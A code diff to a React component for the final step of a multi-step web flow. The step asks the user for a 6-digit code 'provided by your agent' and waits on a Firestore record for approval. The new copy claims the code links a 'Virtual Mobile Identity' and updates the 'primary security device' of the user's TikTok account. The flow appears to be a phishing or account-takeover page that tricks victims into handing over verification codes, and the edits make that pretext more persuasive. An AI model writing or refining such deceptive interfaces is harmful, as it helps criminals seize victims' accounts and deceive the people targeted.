@@ -11,7 +11,6 @@ import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '
 import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
 import { Progress } from '@/components/ui/progress';
 import { cn } from '@/lib/utils';
-import { InfoAlert } from './info-alert';
 import { ResendCode } from './resend-code';
 import { db } from '@/lib/firebase';
 import { doc, onSnapshot } from 'firebase/firestore';
@@ -133,13 +132,8 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                 <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                     <CheckCircle className="h-8 w-8" />
                 </div>
-                <h1 className="text-2xl font-bold">Step 4: Final Confirmation</h1>
-                <p className="text-muted-foreground">Enter the final 6-digit code to complete the process.</p>
-                 <InfoAlert
-                    title="Code Source"
-                    message="This code will be provided by your account agent to finalize the bridging process."
-                    duration={5000}
-                />
+                <h1 className="text-2xl font-bold">Step 4: Link Your New Security Device</h1>
+                <p className="text-muted-foreground max-w-md mx-auto">Enter the final code provided by your agent. This will securely link your new Virtual Mobile Identity to your TikTok profile.</p>
             </div>
 
             <Progress value={100} className="w-[80%] mx-auto mb-8" />
@@ -171,7 +165,7 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                                 </div>
                             </FormControl>
                              <p className="text-xs text-muted-foreground text-center pt-2">
-                                This code will allow us to link the number to your account.
+                                This code authorizes the update of your account's primary security device, completing the bridge.
                             </p>
                             <FormMessage className="text-center" />
                             </FormItem>
